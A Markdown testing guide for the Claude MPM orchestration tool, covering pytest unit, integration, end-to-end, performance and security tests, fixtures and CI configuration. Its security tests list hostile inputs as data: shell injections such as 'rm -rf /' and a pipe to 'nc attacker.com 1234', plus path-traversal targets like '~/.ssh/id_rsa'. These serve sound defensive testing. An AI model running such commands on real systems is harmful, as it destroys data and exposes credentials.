# Testing Guide

This comprehensive guide covers all aspects of testing Claude MPM, from unit tests to end-to-end testing of multi-process orchestration.

## Testing Overview

Claude MPM's testing strategy encompasses:
- **Unit Tests**: Test individual components in isolation
- **Integration Tests**: Test component interactions
- **End-to-End Tests**: Test complete workflows
- **Performance Tests**: Ensure system efficiency
- **Security Tests**: Validate security measures

## Test Structure

```
tests/
├── unit/                   # Unit tests
│   ├── test_orchestrators.py
│   ├── test_agent_registry.py
│   ├── test_ticket_extractor.py
│   └── test_hooks.py
├── integration/            # Integration tests
│   ├── test_subprocess_flow.py
│   ├── test_agent_execution.py
│   └── test_hook_integration.py
├── e2e/                    # End-to-end tests
│   ├── test_cli_workflows.py
│   ├── test_multi_agent.py
│   └── test_full_session.py
├── fixtures/               # Test data and fixtures
│   ├── agents/
│   ├── configs/
│   └── responses/
├── conftest.py            # Shared pytest configuration
└── test_imports.py        # Basic import tests
```

## Running Tests

### Quick Test Commands

```bash
# Run all tests
pytest

# Run with verbose output
pytest -v

# Run specific test file
pytest tests/unit/test_orchestrators.py

# Run specific test
pytest tests/unit/test_orchestrators.py::TestSubprocessOrchestrator::test_start

# Run tests matching pattern
pytest -k "test_agent"

# Run with coverage
pytest --cov=src/claude_mpm --cov-report=html

# Run in parallel
pytest -n auto

# Run only fast tests
pytest -m "not slow"
```

### Test Scripts

```bash
# Run unit tests only
./scripts/run_unit_tests.sh

# Run E2E tests
./scripts/run_e2e_tests.sh

# Run full test suite
./scripts/run_all_tests.sh

# Run tests with different Python versions
tox
```

## Unit Testing

### Testing Orchestrators

```python
# tests/unit/test_orchestrators.py
import pytest
from unittest.mock import Mock, patch, MagicMock
from claude_mpm.orchestration import SubprocessOrchestrator

class TestSubprocessOrchestrator:
    """Test subprocess orchestrator functionality."""
    
    @pytest.fixture
    def mock_launcher(self):
        """Create mock launcher."""
        launcher = Mock()
        launcher.build_command.return_value = ['claude']
        return launcher
    
    @pytest.fixture
    def orchestrator(self, mock_launcher):
        """Create orchestrator with mocked dependencies."""
        return SubprocessOrchestrator(
            launcher=mock_launcher,
            config={'timeout': 30}
        )
    
    def test_start_creates_subprocess(self, orchestrator):
        """Test that start creates a subprocess."""
        with patch('subprocess.Popen') as mock_popen:
            mock_process = Mock()
            mock_popen.return_value = mock_process
            
            orchestrator.start()
            
            mock_popen.assert_called_once()
            assert orchestrator.process == mock_process
    
    def test_send_message_writes_to_stdin(self, orchestrator):
        """Test sending messages to subprocess."""
        mock_process = Mock()
        mock_process.stdin = Mock()
        orchestrator.process = mock_process
        
        orchestrator.send_message("test message")
        
        mock_process.stdin.write.assert_called_with("test message\n")
        mock_process.stdin.flush.assert_called_once()
    
    def test_pattern_detection(self, orchestrator):
        """Test pattern detection in output."""
        orchestrator.pattern_detector = Mock()
        orchestrator.pattern_detector.detect.return_value = [
            Mock(type='delegation', agent='engineer', task='Create function')
        ]
        
        patterns = orchestrator._detect_patterns("**Engineer**: Create function")
        
        assert len(patterns) == 1
        assert patterns[0].type == 'delegation'
```

### Testing Agents

```python
# tests/unit/test_agent_system.py
import pytest
from pathlib import Path
from claude_mpm.agents import Agent, AgentRegistry

class TestAgentRegistry:
    """Test agent registry functionality."""
    
    @pytest.fixture
    def registry(self, tmp_path):
        """Create registry with test agents."""
        # Create test agent files
        agents_dir = tmp_path / "agents"
        agents_dir.mkdir()
        
        (agents_dir / "test_agent.md").write_text("""
---
specializations: [testing, mock]
capabilities: [test, validate]
---

You are a Test Agent.
        """)
        
        registry = AgentRegistry()
        registry.discovery_paths = [agents_dir]
        return registry
    
    def test_discover_agents(self, registry):
        """Test agent discovery."""
        registry.discover_agents()
        
        agents = registry.list_agents()
        assert len(agents) > 0
        
        test_agent = registry.get_agent("test")
        assert test_agent is not None
        assert "testing" in test_agent.specializations
    
    def test_agent_priority(self, registry, tmp_path):
        """Test agent priority system."""
        # Create system and project agents with same name
        system_dir = tmp_path / "system"
        project_dir = tmp_path / "project"
        
        system_dir.mkdir()
        project_dir.mkdir()
        
        # System agent (lower priority)
        (system_dir / "worker_agent.md").write_text("""
---
version: system
---
System worker agent.
        """)
        
        # Project agent (higher priority)
        (project_dir / "worker_agent.md").write_text("""
---
version: project
---
Project worker agent.
        """)
        
        registry.discovery_paths = [system_dir, project_dir]
        registry.discover_agents()
        
        worker = registry.get_agent("worker")
        assert "Project worker agent" in worker.template
```

### Testing Hooks

```python
# tests/unit/test_hooks.py
import pytest
from claude_mpm.hooks import HookService, PreMessageHook

class TestHookService:
    """Test hook service functionality."""
    
    @pytest.fixture
    def hook_service(self):
        """Create hook service."""
        return HookService({'enabled': True})
    
    def test_register_hook(self, hook_service):
        """Test hook registration."""
        hook = Mock(spec=PreMessageHook)
        hook.name = "test_hook"
        
        hook_service.register_hook('pre_message', hook)
        
        hooks = hook_service.registry.get_hooks('pre_message')
        assert len(hooks) == 1
        assert hooks[0].name == "test_hook"
    
    def test_execute_hooks_in_order(self, hook_service):
        """Test hooks execute in priority order."""
        executed_order = []
        
        # Create hooks with different priorities
        hook1 = Mock(priority=10)
        hook1.execute.side_effect = lambda x: executed_order.append(1) or x
        
        hook2 = Mock(priority=5)  # Higher priority (lower number)
        hook2.execute.side_effect = lambda x: executed_order.append(2) or x
        
        hook_service.register_hook('test_event', hook1)
        hook_service.register_hook('test_event', hook2)
        
        hook_service.execute_hooks('test_event', "data")
        
        # Hook2 should execute first (lower priority number)
        assert executed_order == [2, 1]
    
    def test_hook_error_handling(self, hook_service):
        """Test hook error doesn't break chain."""
        hook1 = Mock()
        hook1.execute.side_effect = Exception("Hook error")
        
        hook2 = Mock()
        hook2.execute.return_value = "modified"
        
        hook_service.register_hook('test', hook1)
        hook_service.register_hook('test', hook2)
        
        # Should continue despite error
        result = hook_service.execute_hooks('test', "data")
        assert result == "modified"
```

## Integration Testing

### Testing Subprocess Integration

```python
# tests/integration/test_subprocess_flow.py
import pytest
import asyncio
from claude_mpm.orchestration import SubprocessOrchestrator
from claude_mpm.core import ClaudeLauncher

class TestSubprocessIntegration:
    """Test subprocess orchestration integration."""
    
    @pytest.fixture
    def real_orchestrator(self):
        """Create real orchestrator (requires Claude CLI)."""
        launcher = ClaudeLauncher()
        return SubprocessOrchestrator(launcher, {'timeout': 30})
    
    @pytest.mark.integration
    @pytest.mark.skipif(not shutil.which('claude'), reason="Claude CLI not installed")
    def test_real_subprocess_communication(self, real_orchestrator):
        """Test real subprocess communication."""
        try:
            real_orchestrator.start()
            
            # Send a simple message
            real_orchestrator.send_message("Say 'Hello test'")
            
            # Read response
            response = real_orchestrator.receive_output()
            
            assert response is not None
            assert "Hello test" in response
            
        finally:
            real_orchestrator.stop()
    
    @pytest.mark.integration
    def test_agent_delegation_flow(self, real_orchestrator):
        """Test full agent delegation flow."""
        with patch('claude_mpm.agents.AgentExecutor') as mock_executor:
            mock_executor.return_value.execute.return_value = [
                Mock(output="Agent completed task", success=True)
            ]
            
            try:
                real_orchestrator.start()
                
                # Send message that triggers delegation
                real_orchestrator.send_message(
                    "**Engineer Agent**: Create a hello world function"
                )
                
                # Process output
                response = real_orchestrator.receive_output()
                
                # Verify delegation was detected and executed
                mock_executor.return_value.execute.assert_called_once()
                
            finally:
                real_orchestrator.stop()
```

### Testing Multi-Agent Workflows

```python
# tests/integration/test_multi_agent.py
import pytest
from concurrent.futures import ThreadPoolExecutor
from claude_mpm.agents import AgentExecutor, AgentRegistry

class TestMultiAgentWorkflow:
    """Test multi-agent coordination."""
    
    @pytest.fixture
    def agent_executor(self):
        """Create agent executor with mock agents."""
        registry = AgentRegistry()
        # Add test agents
        return AgentExecutor(registry=registry, max_workers=4)
    
    @pytest.mark.integration
    def test_parallel_agent_execution(self, agent_executor):
        """Test agents execute in parallel."""
        import time
        
        # Create delegations that take time
        delegations = [
            Mock(agent='agent1', task='Task 1', context={}),
            Mock(agent='agent2', task='Task 2', context={}),
            Mock(agent='agent3', task='Task 3', context={})
        ]
        
        # Mock agent execution to take 1 second each
        def mock_execute(delegation):
            time.sleep(1)
            return f"Completed: {delegation.task}"
        
        with patch.object(agent_executor, '_execute_single', side_effect=mock_execute):
            start_time = time.time()
            results = agent_executor.execute_delegations(delegations)
            end_time = time.time()
            
            # Should complete in ~1 second (parallel), not 3 seconds
            assert end_time - start_time < 2
            assert len(results) == 3
    
    @pytest.mark.integration
    def test_agent_error_handling(self, agent_executor):
        """Test handling of agent failures."""
        delegations = [
            Mock(agent='good_agent', task='Good task', context={}),
            Mock(agent='bad_agent', task='Bad task', context={}),
            Mock(agent='good_agent2', task='Another good task', context={})
        ]
        
        def mock_execute(delegation):
            if 'bad' in delegation.agent:
                raise Exception("Agent failed")
            return f"Success: {delegation.task}"
        
        with patch.object(agent_executor, '_execute_single', side_effect=mock_execute):
            results = agent_executor.execute_delegations(delegations)
            
            # Should handle failure gracefully
            assert len(results) == 3
            assert results[0].success is True
            assert results[1].success is False
            assert results[2].success is True
```

## End-to-End Testing

### CLI Workflow Tests

```python
# tests/e2e/test_cli_workflows.py
import pytest
import subprocess
import tempfile
from pathlib import Path

class TestCLIWorkflows:
    """Test complete CLI workflows."""
    
    @pytest.mark.e2e
    def test_basic_cli_workflow(self):
        """Test basic CLI usage."""
        # Test version command
        result = subprocess.run(
            ['./claude-mpm', '--version'],
            capture_output=True,
            text=True
        )
        assert result.returncode == 0
        assert 'claude-mpm' in result.stdout
    
    @pytest.mark.e2e
    def test_non_interactive_prompt(self):
        """Test non-interactive mode."""
        result = subprocess.run(
            ['./claude-mpm', 'run', '-i', 'What is 2+2?', '--non-interactive'],
            capture_output=True,
            text=True,
            timeout=30
        )
        
        assert result.returncode == 0
        assert '4' in result.stdout
    
    @pytest.mark.e2e
    def test_ticket_extraction(self, tmp_path):
        """Test ticket extraction workflow."""
        # Create test prompt with tickets
        prompt = """Please analyze this code:
        
        def calculate_total(items):
            # TODO: Add input validation
            # BUG: Doesn't handle empty lists
            return sum(items)
        
        FEATURE: Add support for weighted totals
        """
        
        result = subprocess.run(
            ['./claude-mpm', 'run', '-i', prompt, '--non-interactive'],
            capture_output=True,
            text=True,
            env={**os.environ, 'CLAUDE_MPM_LOG_DIR': str(tmp_path)}
        )
        
        # Check logs for ticket creation
        log_files = list(tmp_path.glob('*.log'))
        assert len(log_files) > 0
        
        log_content = log_files[0].read_text()
        assert 'TODO' in log_content
        assert 'BUG' in log_content
        assert 'FEATURE' in log_content
```

### Full Session Tests

```python
# tests/e2e/test_full_session.py
import pytest
import pexpect
import sys

class TestFullSession:
    """Test complete interactive sessions."""
    
    @pytest.mark.e2e
    @pytest.mark.slow
    def test_interactive_session(self):
        """Test full interactive session."""
        # Start claude-mpm in interactive mode
        child = pexpect.spawn('./claude-mpm', timeout=30)
        
        try:
            # Wait for prompt
            child.expect(['Human:', pexpect.TIMEOUT])
            
            # Send a message
            child.sendline('Hello, can you help me write a Python function?')
            
            # Wait for response
            child.expect(['Assistant:', pexpect.TIMEOUT])
            
            # Verify response contains expected content
            response = child.before.decode('utf-8')
            assert 'function' in response.lower() or 'python' in response.lower()
            
            # Exit cleanly
            child.sendline('exit')
            child.expect(pexpect.EOF)
            
        finally:
            child.terminate()
    
    @pytest.mark.e2e
    @pytest.mark.slow  
    def test_multi_agent_session(self):
        """Test session with multiple agent delegations."""
        test_prompt = """
        I need help building a web API. Please:
        1. Design the API endpoints
        2. Implement the code
        3. Write tests
        4. Create documentation
        """
        
        result = subprocess.run(
            ['./claude-mpm', 'run', '--subprocess', '-i', test_prompt, '--non-interactive'],
            capture_output=True,
            text=True,
            timeout=120
        )
        
        assert result.returncode == 0
        
        # Should see multiple agent delegations
        output = result.stdout
        assert any(agent in output for agent in ['Engineer', 'QA', 'Documentation'])
```

## Mock Strategies

### Mocking Subprocesses

```python
# tests/conftest.py
import pytest
from unittest.mock import Mock, MagicMock

@pytest.fixture
def mock_subprocess():
    """Create a mock subprocess."""
    mock_proc = Mock()
    mock_proc.poll.return_value = None  # Process is running
    mock_proc.pid = 12345
    
    # Mock stdin
    mock_proc.stdin = Mock()
    mock_proc.stdin.write = Mock()
    mock_proc.stdin.flush = Mock()
    
    # Mock stdout with iterator
    mock_proc.stdout = MagicMock()
    mock_proc.stdout.__iter__.return_value = iter([
        "Assistant: I'll help you with that.\n",
        "**Engineer Agent**: Creating the function now.\n",
        "Done!\n"
    ])
    
    # Mock stderr
    mock_proc.stderr = Mock()
    mock_proc.stderr.readline.return_value = ""
    
    return mock_proc

@pytest.fixture
def mock_claude_response():
    """Create mock Claude responses."""
    responses = {
        'greeting': "Hello! I'm Claude, how can I help you?",
        'delegation': "**Engineer Agent**: I'll create that function for you.",
        'error': "I encountered an error processing your request."
    }
    return responses
```

### Mocking External Services

```python
@pytest.fixture
def mock_trackdown_client():
    """Mock AI-Trackdown client."""
    client = Mock()
    client.create_ticket.return_value = {
        'id': 'TRACK-123',
        'url': 'https://trackdown.ai/tickets/TRACK-123',
        'status': 'created'
    }
    client.get_ticket.return_value = {
        'id': 'TRACK-123',
        'title': 'Test ticket',
        'status': 'open'
    }
    return client
```

## Performance Testing

### Load Testing

```python
# tests/performance/test_load.py
import pytest
import time
import concurrent.futures
from claude_mpm.orchestration import SubprocessOrchestrator

class TestPerformance:
    """Test system performance under load."""
    
    @pytest.mark.performance
    @pytest.mark.slow
    def test_concurrent_orchestrators(self):
        """Test multiple orchestrators running concurrently."""
        num_orchestrators = 10
        
        def create_and_run_orchestrator(index):
            orchestrator = SubprocessOrchestrator(
                Mock(),  # mock launcher
                {'timeout': 30}
            )
            
            start_time = time.time()
            
            with patch('subprocess.Popen'):
                orchestrator.start()
                orchestrator.send_message(f"Test {index}")
                orchestrator.stop()
            
            return time.time() - start_time
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_orchestrators) as executor:
            futures = [
                executor.submit(create_and_run_orchestrator, i)
                for i in range(num_orchestrators)
            ]
            
            times = [f.result() for f in futures]
        
        # All should complete reasonably quickly
        assert all(t < 5.0 for t in times)
        assert max(times) < 10.0  # No severe degradation
    
    @pytest.mark.performance
    def test_large_output_handling(self):
        """Test handling of large outputs."""
        orchestrator = SubprocessOrchestrator(Mock(), {})
        
        # Create large output (1MB)
        large_output = "x" * (1024 * 1024)
        
        with patch('subprocess.Popen') as mock_popen:
            mock_proc = Mock()
            mock_proc.stdout.readline.side_effect = [
                large_output + "\n",
                ""  # EOF
            ]
            mock_popen.return_value = mock_proc
            
            orchestrator.start()
            
            start_time = time.time()
            output = orchestrator.receive_output()
            process_time = time.time() - start_time
            
            # Should handle large output efficiently
            assert len(output) > 1000000
            assert process_time < 1.0  # Should be fast
```

### Memory Testing

```python
@pytest.mark.performance
def test_memory_usage():
    """Test memory usage doesn't grow unbounded."""
    import psutil
    import gc
    
    process = psutil.Process()
    initial_memory = process.memory_info().rss / 1024 / 1024  # MB
    
    # Run many operations
    for i in range(100):
        orchestrator = SubprocessOrchestrator(Mock(), {})
        with patch('subprocess.Popen'):
            orchestrator.start()
            orchestrator.send_message("Test message")
            orchestrator.stop()
        
        # Force cleanup
        del orchestrator
        gc.collect()
    
    final_memory = process.memory_info().rss / 1024 / 1024  # MB
    memory_growth = final_memory - initial_memory
    
    # Memory growth should be minimal
    assert memory_growth < 50  # Less than 50MB growth
```

## Security Testing

### Input Validation Tests

```python
# tests/security/test_input_validation.py
import pytest
from claude_mpm.utils import validate_input

class TestSecurity:
    """Test security measures."""
    
    @pytest.mark.security
    def test_command_injection_prevention(self):
        """Test prevention of command injection."""
        dangerous_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test `whoami`",
            "test $(ls /)",
            "test\n/bin/sh"
        ]
        
        for dangerous_input in dangerous_inputs:
            with pytest.raises(ValueError):
                validate_input(dangerous_input)
    
    @pytest.mark.security
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal."""
        dangerous_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "~/.ssh/id_rsa",
            "..\\..\\windows\\system32"
        ]
        
        from claude_mpm.utils import validate_file_path
        
        for dangerous_path in dangerous_paths:
            with pytest.raises(ValueError):
                validate_file_path(dangerous_path)
    
    @pytest.mark.security
    def test_sensitive_data_redaction(self):
        """Test sensitive data is redacted."""
        from claude_mpm.utils import redact_sensitive
        
        sensitive_text = """
        API_KEY=sk-1234567890abcdef
        password: mysecretpass
        token: eyJhbGciOiJIUzI1NiIs...
        """
        
        redacted = redact_sensitive(sensitive_text)
        
        assert "sk-1234567890abcdef" not in redacted
        assert "mysecretpass" not in redacted
        assert "eyJhbGciOiJIUzI1NiIs" not in redacted
        assert "[REDACTED]" in redacted
```

## Test Fixtures

### Shared Fixtures

```python
# tests/fixtures/agents.py
import pytest
from pathlib import Path

@pytest.fixture
def sample_agents(tmp_path):
    """Create sample agent files."""
    agents_dir = tmp_path / "agents"
    agents_dir.mkdir()
    
    agents = {
        'engineer': """
---
specializations: [coding, architecture]
capabilities: [create, modify, refactor]
---

You are an Engineer Agent.
        """,
        'qa': """
---
specializations: [testing, validation]
capabilities: [test, verify, validate]
---

You are a QA Agent.
        """
    }
    
    for name, content in agents.items():
        (agents_dir / f"{name}_agent.md").write_text(content)
    
    return agents_dir
```

### Response Fixtures

```python
# tests/fixtures/responses.py
CLAUDE_RESPONSES = {
    'simple': "I'll help you with that task.",
    
    'with_delegation': """
I'll help you create that function.

**Engineer Agent**: Create a Python function that calculates factorial

Here's what the engineer will implement:
1. Recursive approach
2. Iterative approach
3. Proper error handling
    """,
    
    'with_tickets': """
I've analyzed your code and found several issues:

TODO: Add input validation to prevent negative numbers
BUG: The function crashes with large inputs due to recursion limit
FEATURE: Add memoization for better performance

I'll help you address these issues.
    """,
    
    'error_response': """
I encountered an error while processing your request.
Error: Unable to access the specified file.
Please check the file path and permissions.
    """
}
```

## Test Configuration

### pytest.ini

```ini
[tool:pytest]
testpaths = tests
python_files = test_*.py
python_classes = Test*
python_functions = test_*

# Markers
markers =
    slow: marks tests as slow (deselect with '-m "not slow"')
    integration: marks tests as integration tests
    e2e: marks tests as end-to-end tests
    security: marks tests as security tests
    performance: marks tests as performance tests

# Options
addopts = 
    -v
    --strict-markers
    --tb=short
    --cov=src/claude_mpm
    --cov-report=term-missing
    --cov-report=html

# Timeout
timeout = 300
timeout_method = thread

# Async
asyncio_mode = auto
```

### conftest.py

```python
# tests/conftest.py
import pytest
import logging
import tempfile
from pathlib import Path

# Configure logging for tests
logging.basicConfig(level=logging.DEBUG)

@pytest.fixture(autouse=True)
def test_environment(monkeypatch):
    """Set up test environment."""
    # Use temp directory for logs
    with tempfile.TemporaryDirectory() as tmpdir:
        monkeypatch.setenv('CLAUDE_MPM_LOG_DIR', tmpdir)
        monkeypatch.setenv('CLAUDE_MPM_DEBUG', 'true')
        yield tmpdir

@pytest.fixture
def isolated_filesystem():
    """Create isolated filesystem for test."""
    with tempfile.TemporaryDirectory() as tmpdir:
        old_cwd = Path.cwd()
        try:
            os.chdir(tmpdir)
            yield Path(tmpdir)
        finally:
            os.chdir(old_cwd)

# Skip markers
def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers", "requires_claude: mark test as requiring Claude CLI"
    )

def pytest_collection_modifyitems(config, items):
    """Modify test collection."""
    # Skip tests requiring Claude if not installed
    if not shutil.which('claude'):
        skip_claude = pytest.mark.skip(reason="Claude CLI not installed")
        for item in items:
            if "requires_claude" in item.keywords:
                item.add_marker(skip_claude)
```

## Continuous Integration

### GitHub Actions

```yaml
# .github/workflows/test.yml
name: Tests

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        python-version: ['3.8', '3.9', '3.10', '3.11']
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install -e ".[dev]"
    
    - name: Run tests
      run: |
        pytest tests/ -v --cov=src/claude_mpm --cov-report=xml
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
```

## Best Practices

### Test Writing Guidelines

1. **Test One Thing**: Each test should verify one specific behavior
2. **Use Descriptive Names**: Test names should describe what they test
3. **Arrange-Act-Assert**: Structure tests clearly
4. **Mock External Dependencies**: Don't rely on external services
5. **Clean Up Resources**: Always clean up in finally blocks or fixtures
6. **Use Markers**: Mark slow, integration, or special tests
7. **Avoid Sleep**: Use proper synchronization instead of time.sleep()

### Example Test Structure

```python
class TestFeature:
    """Test specific feature."""
    
    def test_specific_behavior(self, fixture1, fixture2):
        """Test that specific behavior works correctly.
        
        This test verifies that when condition X occurs,
        the system responds with behavior Y.
        """
        # Arrange
        input_data = create_test_data()
        expected_result = "expected output"
        
        # Act
        actual_result = feature_under_test(input_data)
        
        # Assert
        assert actual_result == expected_result
        assert_other_conditions()
```

## Debugging Tests

### Running Tests in Debug Mode

```bash
# Run with pytest debugging
pytest --pdb tests/test_file.py

# Run with logging
pytest -s tests/test_file.py

# Run with verbose output
pytest -vv tests/test_file.py

# Run specific test with debugging
pytest -vv -s --pdb tests/test_file.py::TestClass::test_method
```

### VS Code Debugging

```json
// .vscode/launch.json
{
    "name": "Debug Test",
    "type": "python",
    "request": "launch",
    "module": "pytest",
    "args": [
        "-vv",
        "${file}::${selectedText}"
    ],
    "console": "integratedTerminal",
    "justMyCode": false
}
```

## Next Steps

1. Review [QA Guide](../QA.md) for comprehensive testing procedures
2. Set up [CI/CD pipeline](.github/workflows/)
3. Run coverage reports regularly
4. Add tests for new features
5. Maintain test documentation